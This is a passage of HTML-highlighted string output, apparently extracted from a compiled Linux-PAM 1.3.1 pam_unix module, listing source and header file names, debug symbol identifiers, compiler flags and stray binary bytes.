class="hljs-string">passverify.c</span><br><span class="hljs-string">stat.h</span><br><span class="hljs-string">stddef.h</span><br><span class="hljs-string">types.h</span><br><span class="hljs-string">struct_timeval.h</span><br><span class="hljs-string">struct_timespec.h</span><br><span class="hljs-string">_pam_types.h</span><br><span class="hljs-string">pwd.h</span><br><span class="hljs-string">FILE.h</span><br><span class="hljs-string">struct_FILE.h</span><br><span class="hljs-string">support.h</span><br><span class="hljs-string">shadow.h</span><br><span class="hljs-string">time.h</span><br><span class="hljs-string">stat.h</span><br><span class="hljs-string">crypt.h</span><br><span class="hljs-string">md5.h</span><br><span class="hljs-string">stdio.h</span><br><span class="hljs-string">unistd.h</span><br><span class="hljs-string">string.h</span><br><span class="hljs-string">time.h</span><br><span class="hljs-string">pam_ext.h</span><br><span class="hljs-string">stdlib.h</span><br><span class="hljs-string">pam_modutil.h</span><br><span class="hljs-string">bigcrypt.h</span><br><span class="hljs-string">&lt;built-in&gt;</span><br><span class="hljs-string">fcntl.h</span><br><span class="hljs-string">errno.h</span><br><span class="hljs-string">/X ..</span><br><span class="hljs-string">X  ..</span><br><span class="hljs-string">[  ..</span><br><span class="hljs-string">= J.</span><br><span class="hljs-string">&lt;  X</span><br><span class="hljs-string">f...</span><br><span class="hljs-string">/usr/include/rpc</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/bits</span><br><span class="hljs-string">/usr/include/x86_64-linux-gnu/sys</span><br><span class="hljs-string">/usr/include/netinet</span><br><span class="hljs-string">yppasswd_xdr.c</span><br><span class="hljs-string">types.h</span><br><span class="hljs-string">types.h</span><br><span class="hljs-string">types.h</span><br><span class="hljs-string">stdint-intn.h</span><br><span class="hljs-string">stdint-uintn.h</span><br><span class="hljs-string">sockaddr.h</span><br><span class="hljs-string">socket.h</span><br><span class="hljs-string">in.h</span><br><span class="hljs-string">un.h</span><br><span class="hljs-string">xdr.h</span><br><span class="hljs-string">yppasswd.h</span><br><span class="hljs-string">/usr/include</span><br><span class="hljs-string">md5.c</span><br><span class="hljs-string">md5_crypt.c</span><br><span class="hljs-string">md5.h</span><br><span class="hljs-string">stdlib.h</span><br><span class="hljs-string">string.h</span><br><span class="hljs-string">&lt;built-in&gt;</span><br><span class="hljs-string">r/;&lt;</span><br><span class="hljs-string">u;=I</span><br><span class="hljs-string">==H&lt;</span><br><span class="hljs-string">0:/;=I&lt;</span><br><span class="hljs-string">18=-</span><br><span class="hljs-string">uI=;</span><br><span class="hljs-string">ue=-</span><br><span class="hljs-string">Jtu-</span><br><span class="hljs-string">ftu-</span><br><span class="hljs-string">K-=-</span><br><span class="hljs-string">Jtu-</span><br><span class="hljs-string">ftu-</span><br><span class="hljs-string">K-=-</span><br><span class="hljs-string">K-=-</span><br><span class="hljs-string">Jtu-</span><br><span class="hljs-string">ftu-</span><br><span class="hljs-string">ftu-</span><br><span class="hljs-string">Jtu-</span><br><span class="hljs-string">.V&gt;,</span><br><span class="hljs-string">.K-=-</span><br><span class="hljs-string">fu-=-</span><br><span class="hljs-string">/-/-Ju.I&lt;</span><br><span class="hljs-string">.W=-</span><br><span class="hljs-string">0,0,.</span><br><span class="hljs-string">.W=-</span><br><span class="hljs-string">.W=-</span><br><span class="hljs-string">0:0:.</span><br><span class="hljs-string">:/=:&lt;</span><br><span class="hljs-string">yJ.K</span><br><span class="hljs-string">        ?/KH</span><br><span class="hljs-string">/usr/include</span><br><span class="hljs-string">md5.c</span><br><span class="hljs-string">md5_crypt.c</span><br><span class="hljs-string">md5.h</span><br><span class="hljs-string">stdlib.h</span><br><span class="hljs-string">string.h</span><br><span class="hljs-string">&lt;built-in&gt;</span><br><span class="hljs-string">r/;&lt;</span><br><span class="hljs-string">u;=I</span><br><span class="hljs-string">==H&lt;</span><br><span class="hljs-string">0:/;=I&lt;</span><br><span class="hljs-string">18=-</span><br><span class="hljs-string">uI=;</span><br><span class="hljs-string">ue=-</span><br><span class="hljs-string">Jtu-</span><br><span class="hljs-string">ftu-</span><br><span class="hljs-string">K-=-</span><br><span class="hljs-string">Jtu-</span><br><span class="hljs-string">ftu-</span><br><span class="hljs-string">K-=-</span><br><span class="hljs-string">K-=-</span><br><span class="hljs-string">Jtu-</span><br><span class="hljs-string">ftu-</span><br><span class="hljs-string">ftu-</span><br><span class="hljs-string">Jtu-</span><br><span class="hljs-string">.V&gt;,</span><br><span class="hljs-string">.K-=-</span><br><span class="hljs-string">fu-=-</span><br><span class="hljs-string">/-/-Ju.I&lt;</span><br><span class="hljs-string">.W=-</span><br><span class="hljs-string">0,0,.</span><br><span class="hljs-string">.W=-</span><br><span class="hljs-string">.W=-</span><br><span class="hljs-string">0:0:.</span><br><span class="hljs-string">:/=:&lt;</span><br><span class="hljs-string">yJ.K</span><br><span class="hljs-string">        ?/KH</span><br><span class="hljs-string">internal</span><br><span class="hljs-string">bigcrypt</span><br><span class="hljs-string">crypt_data</span><br><span class="hljs-string">short unsigned int</span><br><span class="hljs-string">cipher_ptr</span><br><span class="hljs-string">__xx__</span><br><span class="hljs-string">tmp_ptr</span><br><span class="hljs-string">unsigned char</span><br><span class="hljs-string">input</span><br><span class="hljs-string">initialized</span><br><span class="hljs-string">bigcrypt.c</span><br><span class="hljs-string">setting</span><br><span class="hljs-string">strncpy</span><br><span class="hljs-string">plaintext_ptr</span><br><span class="hljs-string">crypt_r</span><br><span class="hljs-string">GNU C17 10.2.1 20210110 -mtune=generic -march=x86-64 -g -O2 -fPIC -fasynchronous-unwind-tables</span><br><span class="hljs-string">long long unsigned int</span><br><span class="hljs-string">dec_c2_cryptbuf</span><br><span class="hljs-string">__builtin_calloc</span><br><span class="hljs-string">long long int</span><br><span class="hljs-string">keybuf</span><br><span class="hljs-string">/root/Linux-PAM-1.3.1/modules/pam_unix</span><br><span class="hljs-string">short int</span><br><span class="hljs-string">keylen</span><br><span class="hljs-string">output</span><br><span class="hljs-string">n_seg</span><br><span class="hljs-string">cdata</span><br><span class="hljs-string">salt_ptr</span><br><span class="hljs-string">malloc</span><br><span class="hljs-string">__off_t</span><br><span class="hljs-string">__gid_t</span><br><span class="hljs-string">_IO_read_ptr</span><br><span class="hljs-string">_pkey</span><br><span class="hljs-string">_chain</span><br><span class="hljs-string">void_uname</span><br><span class="hljs-string">__sigval_t</span><br><span class="hljs-string">si_errno</span><br><span class="hljs-string">_shortbuf</span><br><span class="hljs-string">_make_remark</span><br><span class="hljs-string">is_hash_algo</span><br><span class="hljs-string">sa_flags</span><br><span class="hljs-string">_IO_read_base</span><br><span class="hljs-string">__sighandler_t</span><br><span class="hljs-string">_lower</span><br><span class="hljs-string">si_stime</span><br><span class="hljs-string">pipe</span><br><span class="hljs-string">_arch</span><br><span class="hljs-string">pw_shell</span><br><span class="hljs-string">_exit</span><br><span class="hljs-string">dup2</span><br><span class="hljs-string">pamh</span><br><span class="hljs-string">_fileno</span><br><span class="hljs-string">_IO_read_end</span><br><span class="hljs-string">_sigchld</span><br><span class="hljs-string">authrv</span><br><span class="hljs-string">_IO_backup_base</span><br><span class="hljs-string">__isoc99_sscanf</span><br><span class="hljs-string">execve</span><br><span class="hljs-string">envp</span><br><span class="hljs-string">_cur_column</span><br><span class="hljs-string">_upper</span><br><span class="hljs-string">si_overrun</span><br><span class="hljs-string">_IO_codecvt</span><br><span class="hljs-string">sp_inact</span><br><span class="hljs-string">_bounds</span><br><span class="hljs-string">si_addr</span><br><span class="hljs-string">sp_max</span><br><span class="hljs-string">_old_offset</span><br><span class="hljs-string">sp_min</span><br><span class="hljs-string">si_addr_lsb</span><br><span class="hljs-string">si_sigval</span><br><span class="hljs-string">sp_flag</span><br><span class="hljs-string">newsa</span><br><span class="hljs-string">geteuid</span><br><span class="hljs-string">__off64_t</span><br><span class="hljs-string">pam_unix_acct.c</span><br><span class="hljs-string">si_pid</span><br><span class="hljs-string">pam_modutil_redirect_fd</span><br><span class="hljs-string">_IO_marker</span><br><span class="hljs-string">_freeres_buf</span><br><span class="hljs-string">PAM_MODUTIL_IGNORE_FD</span><br><span class="hljs-string">__val</span><br><span class="hljs-string">si_utime</span><br><span class="hljs-string">get_account_info</span><br><span class="hljs-string">_IO_write_ptr</span><br><span class="hljs-string">__sigset_t</span><br><span class="hljs-string">waitpid</span><br><span class="hljs-string">fork</span><br><span class="hljs-string">si_uid</span><br><span class="hljs-string">_pad</span><br><span class="hljs-string">siginfo_t</span><br><span class="hljs-string">_IO_save_base</span><br><span class="hljs-string">sival_int</span><br><span class="hljs-string">sp_expire</span><br><span class="hljs-string">pam_modutil_sanitize_helper_fds</span><br><span class="hljs-string">_lock</span><br><span class="hljs-string">_sigsys</span><br><span class="hljs-string">_flags2</span><br><span class="hljs-string">__builtin_puts</span><br><span class="hljs-string">stdout</span><br><span class="hljs-string">pw_passwd</span><br><span class="hljs-string">_syscall</span><br><span class="hljs-string">pam_sm_acct_mgmt</span><br><span class="hljs-string">unix_args</span><br><span class="hljs-string">pw_gid</span><br><span class="hljs-string">_sigpoll</span><br><span class="hljs-string">_sifields</span><br><span class="hljs-string">pam_get_data</span><br><span class="hljs-string">_IO_write_end</span><br><span class="hljs-string">PAM_MODUTIL_PIPE_FD</span><br><span class="hljs-string">_IO_lock_t</span><br><span class="hljs-string">_IO_FILE</span><br><span class="hljs-string">setuid</span><br><span class="hljs-string">oldsa</span><br><span class="hljs-string">si_tid</span><br><span class="hljs-string">__clock_t</span><br><span class="hljs-string">UNIX_Ctrls</span><br><span class="hljs-string">pam_get_item</span><br><span class="hljs-string">dcngettext</span><br><span class="hljs-string">sp_pwdp</span><br><span class="hljs-string">PAM_MODUTIL_NULL_FD</span><br><span class="hljs-string">token</span><br><span class="hljs-string">fflush</span><br><span class="hljs-string">_markers</span><br><span class="hljs-string">pw_dir</span><br><span class="hljs-string">_sigfault</span><br><span class="hljs-string">sp_warn</span><br><span class="hljs-string">pam_handle_t</span><br><span class="hljs-string">_IO_buf_end</span><br><span class="hljs-string">_addr_bnd</span><br><span class="hljs-string">__pid_t</span><br><span class="hljs-string">_call_addr</span><br><span class="hljs-string">pw_gecos</span><br><span class="hljs-string">_vtable_offset</span><br><span class="hljs-string">pretval</span><br><span class="hljs-string">dcgettext</span><br><span class="hljs-string">spwd</span><br><span class="hljs-string">si_status</span><br><span class="hljs-string">argc</span><br><span class="hljs-string">__errno_location</span><br><span class="hljs-string">__uint32_t</span><br><span class="hljs-string">check_shadow_expiry</span><br><span class="hljs-string">__uid_t</span><br><span class="hljs-string">__sigaction_handler</span><br><span class="hljs-string">si_signo</span><br><span class="hljs-string">_kill</span><br><span class="hljs-string">_IO_save_end</span><br><span class="hljs-string">sa_sigaction</span><br><span class="hljs-string">sa_mask</span><br><span class="hljs-string">daysleft</span><br><span class="hljs-string">__pad0</span><br><span class="hljs-string">__pad5</span><br><span class="hljs-string">snprintf</span><br><span class="hljs-string">sp_lstchg</span><br><span class="hljs-string">_unused2</span><br><span class="hljs-string">sa_restorer</span><br><span class="hljs-string">pw_name</span><br><span class="hljs-string">_unix_run_verify_binary</span><br><span class="hljs-string">pam_handle</span><br><span class="hljs-string">_set_ctrl</span><br><span class="hljs-string">getuid</span><br><span class="hljs-string">pam_modutil_read</span><br><span class="hljs-string">_timer</span><br><span class="hljs-string">si_fd</span><br><span class="hljs-string">pam_syslog</span><br><span class="hljs-string">pw_uid</span><br><span class="hljs-string">sa_handler</span><br><span class="hljs-string">_freeres_list</span><br><span class="hljs-string">sival_ptr</span><br><span class="hljs-string">_IO_wide_data</span><br><span class="hljs-string">si_band</span><br><span class="hljs-string">argv</span><br><span class="hljs-string">_IO_write_base</span><br><span class="hljs-string">_IO_buf_base</span><br><span class="hljs-string">sp_namp</span><br><span class="hljs-string">child</span><br><span class="hljs-string">si_code</span><br><span class="hljs-string">ret_data</span><br><span class="hljs-string">pam_sm_setcred</span><br><span class="hljs-string">_unix_verify_password</span><br><span class="hljs-string">_unix_blankpasswd</span><br><span class="hljs-string">pam_set_data</span><br><span class="hljs-string">pam_get_authtok</span><br><span class="hljs-string">setcred_free</span><br><span class="hljs-string">pam_get_user</span><br><span class="hljs-string">pam_sm_authenticate</span><br><span class="hljs-string">pam_unix_auth.c</span><br><span class="hljs-string">pass_old</span><br><span class="hljs-string">AUTH_REJECTEDCRED</span><br><span class="hljs-string">XDR_DECODE</span><br><span class="hljs-string">sockaddr_ax25</span><br><span class="hljs-string">sin6_flowinfo</span><br><span class="hljs-string">RPC_CANTDECODEARGS</span><br><span class="hljs-string">fclose</span><br><span class="hljs-string">RE_why</span><br><span class="hljs-string">lctrl</span><br><span class="hljs-string">RE_lb</span><br><span class="hljs-string">xdrproc_t</span><br><span class="hljs-string">strncmp</span><br><span class="hljs-string">_do_setpass</span><br><span class="hljs-string">ah_ops</span><br><span class="hljs-string">RPC_RPCBFAILURE</span><br><span class="hljs-string">sptr</span><br><span class="hljs-string">sockaddr</span><br><span class="hljs-string">sin6_scope_id</span><br><span class="hljs-string">high</span><br><span class="hljs-string">sockaddr_ns</span><br><span class="hljs-string">clnt_sperrno</span><br><span class="hljs-string">RPC_CANTDECODERES</span><br><span class="hljs-string">pam_sm_chauthtok</span><br><span class="hljs-string">__int32_t</span><br><span class="hljs-string">xdr_op</span><br><span class="hljs-string">md5pass</span><br><span class="hljs-string">ah_verf</span><br><span class="hljs-string">IPPROTO_IGMP</span><br><span class="hljs-string">IPPORT_TFTP</span><br><span class="hljs-string">pam_unix_passwd.c</span><br><span class="hljs-string">IPPORT_USERRESERVED</span><br><span class="hljs-string">IPPORT_NAMESERVER</span><br><span class="hljs-string">RPC_PROGNOTREGISTERED</span><br><span class="hljs-string">IPPORT_SYSTAT</span><br><span class="hljs-string">cl_freeres</span><br><span class="hljs-string">x_getint32</span><br><span class="hljs-string">__u6_addr16</span><br><span class="hljs-string">__caddr_t</span><br><span class="hljs-string">IPPROTO_SCTP</span><br><span class="hljs-string">IPPROTO_IP</span><br><span class="hljs-string">auth_ops</span><br><span class="hljs-string">sockaddr_ipx</span><br><span class="hljs-string">ah_nextverf</span><br><span class="hljs-string">newpass</span><br><span class="hljs-string">IPPORT_WHOIS</span><br><span class="hljs-string">getNISserver</span><br><span class="hljs-string">IPPORT_CMDSERVER</span><br><span class="hljs-string">IPPORT_FTP</span><br><span class="hljs-string">in_addr_t</span><br><span class="hljs-string">Goodcrypt_md5</span><br><span class="hljs-string">IPPROTO_ESP</span><br><span class="hljs-string">_unix_getpwnam</span><br><span class="hljs-string">x_getpostn</span><br><span class="hljs-string">IPPROTO_EGP</span><br><span class="hljs-string">sockaddr_at</span><br><span class="hljs-string">RPC_INTR</span><br><span class="hljs-string">ah_refresh</span><br><span class="hljs-string">IPPROTO_IPV6</span><br><span class="hljs-string">__u6_addr8</span><br><span class="hljs-string">RPC_INPROGRESS</span><br><span class="hljs-string">clnt_ops</span><br><span class="hljs-string">CLIENT</span><br><span class="hljs-string">IPPORT_FINGER</span><br><span class="hljs-string">AUTH_BADVERF</span><br><span class="hljs-string">_unix_comesfromsource</span><br><span class="hljs-string">IPPORT_WHOSERVER</span><br><span class="hljs-string">unlock_pwdf</span><br><span class="hljs-string">__uint16_t</span><br><span class="hljs-string">IPPROTO_MAX</span><br><span class="hljs-string">RPC_CANTSEND</span><br><span class="hljs-string">oa_length</span><br><span class="hljs-string">x_getbytes</span><br><span class="hljs-string">RPC_SUCCESS</span><br><span class="hljs-string">in_port_t</span><br><span class="hljs-string">RPC_VERSMISMATCH</span><br><span class="hljs-string">IPPORT_RJE</span><br><span class="hljs-string">IPPORT_BIFFUDP</span><br><span class="hljs-string">strtok_r</span><br><span class="hljs-string">RPC_SYSTEMERROR</span><br><span class="hljs-string">re_status</span><br><span class="hljs-string">sin_zero</span><br><span class="hljs-string">x_destroy</span><br><span class="hljs-string">RPC_UNKNOWNADDR</span><br><span class="hljs-string">IPPORT_SMTP</span><br><span class="hljs-string">s_addr</span><br><span class="hljs-string">cl_geterr</span><br><span class="hljs-string">x_ops</span><br><span class="hljs-string">sa_family_t</span><br><span class="hljs-string">cl_private</span><br><span class="hljs-string">s_luser</span><br><span class="hljs-string">cl_call</span><br><span class="hljs-string">bool_t</span><br><span class="hljs-string">IPPROTO_BEETPH</span><br><span class="hljs-string">RPC_TIMEDOUT</span><br><span class="hljs-string">pam_set_item</span><br><span class="hljs-string">x_putint32</span><br><span class="hljs-string">sockaddr_inarp</span><br><span class="hljs-string">enum_t</span><br><span class="hljs-string">oa_flavor</span><br><span class="hljs-string">sin_family</span><br><span class="hljs-string">tv_usec</span><br><span class="hljs-string">__u_long</span><br><span class="hljs-string">AUTH_OK</span><br><span class="hljs-string">sockaddr_iso</span><br><span class="hljs-string">AUTH</span><br><span class="hljs-string">IPPROTO_UDP</span><br><span class="hljs-string">XDR_FREE</span><br><span class="hljs-string">s_npas</span><br><span class="hljs-string">x_public</span><br><span class="hljs-string">RE_errno</span><br><span class="hljs-string">yperr_string</span><br><span class="hljs-string">remember</span><br><span class="hljs-string">opaque_auth</span><br><span class="hljs-string">rounds</span><br><span class="hljs-string">cl_ops</span><br><span class="hljs-string">IPPROTO_IPIP</span><br><span class="hljs-string">IPPORT_LOGINSERVER</span><br><span class="hljs-string">x_putlong</span><br><span class="hljs-string">IPPORT_ROUTESERVER</span><br><span class="hljs-string">unix_update_passwd</span><br><span class="hljs-string">ah_cred</span><br><span class="hljs-string">RPC_TLIERROR</span><br><span class="hljs-string">towhat</span><br><span class="hljs-string">x_inline</span><br><span class="hljs-string">forwho</span><br><span class="hljs-string">IPPORT_DISCARD</span><br><span class="hljs-string">x_putbytes</span><br><span class="hljs-string">s_pas</span><br><span class="hljs-string">ah_marshal</span><br><span class="hljs-string">IPPORT_ECHO</span><br><span class="hljs-string">cl_abort</span><br><span class="hljs-string">xdr_ops</span><br><span class="hljs-string">RPC_PROGUNAVAIL</span><br><span class="hljs-string">opwfile</span><br><span class="hljs-string">IPPROTO_PUP</span><br><span class="hljs-string">check_old_password</span><br><span class="hljs-string">XDR_ENCODE</span><br><span class="hljs-string">sin_port</span><br><span class="hljs-string">IPPROTO_AH</span><br><span class="hljs-string">sockaddr_eon</span><br><span class="hljs-string">authunix_create_default</span><br><span class="hljs-string">IPPROTO_ICMP</span><br><span class="hljs-string">unlocked</span><br><span class="hljs-string">__u6_addr32</span><br><span class="hljs-string">sockaddr_un</span><br><span class="hljs-string">create_password_hash</span><br><span class="hljs-string">newpw</span><br><span class="hljs-string">yp_get_default_domain</span><br><span class="hljs-string">RPC_STALERACHANDLE</span><br><span class="hljs-string">__in6_u</span><br><span class="hljs-string">sin_addr</span><br><span class="hljs-string">ah_validate</span><br><span class="hljs-string">RPC_FAILED</span><br><span class="hljs-string">RE_vers</span><br><span class="hljs-string">cl_destroy</span><br><span class="hljs-string">fopen</span><br><span class="hljs-string">AUTH_BADCRED</span><br><span class="hljs-string">save_old_password</span><br><span class="hljs-string">done</span><br><span class="hljs-string">IPPROTO_IDP</span><br><span class="hljs-string">x_setpostn</span><br><span class="hljs-string">fgets</span><br><span class="hljs-string">timeval</span><br><span class="hljs-string">yppwd</span><br><span class="hljs-string">long double</span><br><span class="hljs-string">oldpass</span><br><span class="hljs-string">AUTH_FAILED</span><br><span class="hljs-string">sin6_port</span><br><span class="hljs-string">IPPORT_NETSTAT</span><br><span class="hljs-string">IPPROTO_RSVP</span><br><span class="hljs-string">IPPROTO_GRE</span><br><span class="hljs-string">x_base</span><br><span class="hljs-string">IPPORT_EXECSERVER</span><br><span class="hljs-string">AUTH_REJECTEDVERF</span><br><span class="hljs-string">yp_master</span><br><span class="hljs-string">IPPORT_TTYLINK</span><br><span class="hljs-string">sin6_family</span><br><span class="hljs-string">_pam_unix_approve_pass</span><br><span class="hljs-string">sockaddr_dl</span><br><span class="hljs-string">oa_base</span><br><span class="hljs-string">IPPORT_TELNET</span><br><span class="hljs-string">RPC_UNKNOWNHOST</span><br><span class="hljs-string">RPC_UNKNOWNPROTO</span><br><span class="hljs-string">IPPROTO_PIM</span><br><span class="hljs-string">sun_family</span><br><span class="hljs-string">ah_private</span><br><span class="hljs-string">RPC_PROGVERSMISMATCH</span><br><span class="hljs-string">RPC_CANTENCODEARGS</span><br><span class="hljs-string">sun_path</span><br><span class="hljs-string">sockaddr_in</span><br><span class="hljs-string">auth_stat</span><br><span class="hljs-string">__uint8_t</span><br><span class="hljs-string">_unix_verify_shadow</span><br><span class="hljs-string">IPPROTO_MTP</span><br><span class="hljs-string">x_getlong</span><br><span class="hljs-string">IPPROTO_TP</span><br><span class="hljs-string">x_op</span><br><span class="hljs-string">fromwhat</span><br><span class="hljs-string">tv_sec</span><br><span class="hljs-string">pass_min_len</span><br><span class="hljs-string">IPPORT_DAYTIME</span><br><span class="hljs-string">AUTH_TOOWEAK</span><br><span class="hljs-string">IPPROTO_UDPLITE</span><br><span class="hljs-string">cl_control</span><br><span class="hljs-string">IPPROTO_COMP</span><br><span class="hljs-string">IPPROTO_ENCAP</span><br><span class="hljs-string">RPC_NOBROADCAST</span><br><span class="hljs-string">rpc_err</span><br><span class="hljs-string">unix_update_shadow</span><br><span class="hljs-string">cl_auth</span><br><span class="hljs-string">timeout</span><br><span class="hljs-string">RPC_N2AXLATEFAILURE</span><br><span class="hljs-string">domainname</span><br><span class="hljs-string">clnt</span><br><span class="hljs-string">ah_key</span><br><span class="hljs-string">__suseconds_t</span><br><span class="hljs-string">IPPORT_SUPDUP</span><br><span class="hljs-string">__time_t</span><br><span class="hljs-string">des_block</span><br><span class="hljs-string">IPPORT_EFSSERVER</span><br><span class="hljs-string">IPPORT_TIMESERVER</span><br><span class="hljs-string">clnt_create</span><br><span class="hljs-string">clnt_stat</span><br><span class="hljs-string">IPPROTO_TCP</span><br><span class="hljs-string">strcmp</span><br><span class="hljs-string">IPPORT_RESERVED</span><br><span class="hljs-string">sa_family</span><br><span class="hljs-string">strdup</span><br><span class="hljs-string">getrpcport</span><br><span class="hljs-string">IPPROTO_MPLS</span><br><span class="hljs-string">pass_new</span><br><span class="hljs-string">RPC_UDERROR</span><br><span class="hljs-string">x_private</span><br><span class="hljs-string">__u_int</span><br><span class="hljs-string">pam_prompt</span><br><span class="hljs-string">x_handy</span><br><span class="hljs-string">s_uid</span><br><span class="hljs-string">IPPORT_MTP</span><br><span class="hljs-string">ah_destroy</span><br><span class="hljs-string">sockaddr_in6</span><br><span class="hljs-string">IPPROTO_DCCP</span><br><span class="hljs-string">sa_data</span><br><span class="hljs-string">is_pwd_shadowed</span><br><span class="hljs-string">sin6_addr</span><br><span class="hljs-string">IPPROTO_RAW</span><br><span class="hljs-string">sockaddr_x25</span><br><span class="hljs-string">retry</span><br><span class="hljs-string">AUTH_INVALIDRESP</span><br><span class="hljs-string">RPC_CANTRECV</span><br><span class="hljs-string">RPC_PROCUNAVAIL</span><br><span class="hljs-string">RPC_AUTHERROR</span><br><span class="hljs-string">pam_modutil_getlogin</span><br><span class="hljs-string">pam_unix_sess.c</span><br><span class="hljs-string">login_name</span><br><span class="hljs-string">service</span><br><span class="hljs-string">user_name</span><br><span class="hljs-string">pam_sm_open_session</span><br><span class="hljs-string">pam_sm_close_session</span><br><span class="hljs-string">__stream</span><br><span class="hljs-string">quiet</span><br><span class="hljs-string">yp_match</span><br><span class="hljs-string">_ISgraph</span><br><span class="hljs-string">_pam_failed_auth</span><br><span class="hljs-string">__ssize_t</span><br><span class="hljs-string">write</span><br><span class="hljs-string">__lineptr</span><br><span class="hljs-string">type</span><br><span class="hljs-string">strcasecmp</span><br><span class="hljs-string">_unix_cleanup</span><br><span class="hljs-string">atoi</span><br><span class="hljs-string">__nptr</span><br><span class="hljs-string">__builtin_memset</span><br><span class="hljs-string">_ISprint</span><br><span class="hljs-string">get_pwd_hash</span><br><span class="hljs-string">_cleanup_failures</span><br><span class="hljs-string">failure</span><br><span class="hljs-string">spasswd</span><br><span class="hljs-string">matched</span><br><span class="hljs-string">yp_bind</span><br><span class="hljs-string">strsep</span><br><span class="hljs-string">filename</span><br><span class="hljs-string">__builtin_memcpy</span><br><span class="hljs-string">_ISpunct</span><br><span class="hljs-string">suid</span><br><span class="hljs-string">userlen</span><br><span class="hljs-string">verify_pwd_hash</span><br><span class="hljs-string">strcpy</span><br><span class="hljs-string">_ISxdigit</span><br><span class="hljs-string">_ISupper</span><br><span class="hljs-string">__ctype_b_loc</span><br><span class="hljs-string">_IScntrl</span><br><span class="hljs-string">support.c</span><br><span class="hljs-string">void_old</span><br><span class="hljs-string">count</span><br><span class="hljs-string">buflen</span><br><span class="hljs-string">shome</span><br><span class="hljs-string">feof</span><br><span class="hljs-string">search_key</span><br><span class="hljs-string">_ISalpha</span><br><span class="hljs-string">_ISblank</span><br><span class="hljs-string">_ISalnum</span><br><span class="hljs-string">slogin</span><br><span class="hljs-string">pam_fail_delay</span><br><span class="hljs-string">_ISspace</span><br><span class="hljs-string">sgid</span><br><span class="hljs-string">getline</span><br><span class="hljs-string">userinfo</span><br><span class="hljs-string">_ISlower</span><br><span class="hljs-string">strtol</span><br><span class="hljs-string">__getdelim</span><br><span class="hljs-string">sgecos</span><br><span class="hljs-string">_unix_run_helper_binary</span><br><span class="hljs-string">yp_unbind</span><br><span class="hljs-string">ruser</span><br><span class="hljs-string">data_name</span><br><span class="hljs-string">sshell</span><br><span class="hljs-string">strncasecmp</span><br><span class="hljs-string">_ISdigit</span><br><span class="hljs-string">files</span><br><span class="hljs-string">rhost</span><br><span class="hljs-string">error_status</span><br><span class="hljs-string">__glibc_reserved</span><br><span class="hljs-string">st_ctim</span><br><span class="hljs-string">unlink</span><br><span class="hljs-string">st_blksize</span><br><span class="hljs-string">st_blocks</span><br><span class="hljs-string">MD5Context</span><br><span class="hljs-string">uint32</span><br><span class="hljs-string">crypted</span><br><span class="hljs-string">st_mtim</span><br><span class="hljs-string">found</span><br><span class="hljs-string">curdays</span><br><span class="hljs-string">__dev_t</span><br><span class="hljs-string">result</span><br><span class="hljs-string">where</span><br><span class="hljs-string">usleep</span><br><span class="hljs-string">strip_hpux_aging</span><br><span class="hljs-string">spwdent</span><br><span class="hljs-string">nbuf</span><br><span class="hljs-string">umask</span><br><span class="hljs-string">__blksize_t</span><br><span class="hljs-string">st_uid</span><br><span class="hljs-string">crypt_make_salt</span><br><span class="hljs-string">st_rdev</span><br><span class="hljs-string">GoodMD5Update</span><br><span class="hljs-string">__syscall_slong_t</span><br><span class="hljs-string">algoid</span><br><span class="hljs-string">ulckpwdf</span><br><span class="hljs-string">timezone</span><br><span class="hljs-string">__mode_t</span><br><span class="hljs-string">fchown</span><br><span class="hljs-string">st_gid</span><br><span class="hljs-string">putspent</span><br><span class="hljs-string">howmany</span><br><span class="hljs-string">stpcpy</span><br><span class="hljs-string">st_size</span><br><span class="hljs-string">getpid</span><br><span class="hljs-string">clock</span><br><span class="hljs-string">fstat</span><br><span class="hljs-string">__blkcnt_t</span><br><span class="hljs-string">tz_minuteswest</span><br><span class="hljs-string">__ino_t</span><br><span class="hljs-string">const_charp</span><br><span class="hljs-string">tmppass</span><br><span class="hljs-string">unix_selinux_confined</span><br><span class="hljs-string">crypt_md5_wrapper</span><br><span class="hljs-string">__builtin_strchr</span><br><span class="hljs-string">bits</span><br><span class="hljs-string">__fd</span><br><span class="hljs-string">pam_modutil_getspnam</span><br><span class="hljs-string">pam_modutil_getpwnam</span><br><span class="hljs-string">rename</span><br><span class="hljs-string">nullok</span><br><span class="hljs-string">__fxstat</span><br><span class="hljs-string">oldmask</span><br><span class="hljs-string">st_nlink</span><br><span class="hljs-string">GoodMD5Final</span><br><span class="hljs-string">passverify.c</span><br><span class="hljs-string">st_dev</span><br><span class="hljs-string">timespec</span><br><span class="hljs-string">fchmod</span><br><span class="hljs-string">gettimeofday</span><br><span class="hljs-string">assigned_passwd</span><br><span class="hljs-string">i64c</span><br><span class="hljs-string">fputs</span><br><span class="hljs-string">fgetspent</span><br><span class="hljs-string">fgetpwent</span><br><span class="hljs-string">tv_nsec</span><br><span class="hljs-string">valid</span><br><span class="hljs-string">stmpent</span><br><span class="hljs-string">GoodMD5Init</span><br><span class="hljs-string">st_mode</span><br><span class="hljs-string">putpwent</span><br><span class="hljs-string">fsync</span><br><span class="hljs-string">tz_dsttime</span><br><span class="hljs-string">Brokencrypt_md5</span><br><span class="hljs-string">hash_len</span><br><span class="hljs-string">st_ino</span><br><span class="hljs-string">__statbuf</span><br><span class="hljs-string">MD5_CTX</span><br><span class="hljs-string">__nlink_t</span><br><span class="hljs-string">st_atim</span><br><span class="hljs-string">wroteentry</span><br><span class="hljs-string">xdr_yppasswd</span><br><span class="hljs-string">xdr_int</span><br><span class="hljs-string">yppasswd_xdr.c</span><br><span class="hljs-string">xdrs</span><br><span class="hljs-string">xdr_string</span><br><span class="hljs-string">objp</span><br><span class="hljs-string">xdr_xpasswd</span><br><span class="hljs-string">longs</span><br><span class="hljs-string">md5_good.c</span><br><span class="hljs-string">final</span><br><span class="hljs-string">to64</span><br><span class="hljs-string">ctx1</span><br><span class="hljs-string">strncat</span><br><span class="hljs-string">__builtin_strlen</span><br><span class="hljs-string">byteReverse</span><br><span class="hljs-string">itoa64</span><br><span class="hljs-string">GoodMD5Transform</span><br><span class="hljs-string">digest</span><br><span class="hljs-string">magic</span><br><span class="hljs-string">BrokenMD5Update</span><br><span class="hljs-string">BrokenMD5Final</span><br><span class="hljs-string">BrokenMD5Transform</span><br><span class="hljs-string">md5_broken.c</span><br><span class="hljs-string">BrokenMD5Init</span><br><span class="hljs-string"> $-(</span><br><span class="hljs-string">Q@I$</span><br><span class="hljs-string">Q@I$</span><br><span class="hljs-string">Q@J$</span><br><span class="hljs-string">Q@J$</span><br><span class="hljs-string"># %!</span><br><span class="hljs-string"># %!x</span><br><span class="hljs-string"># %!</span><br><span 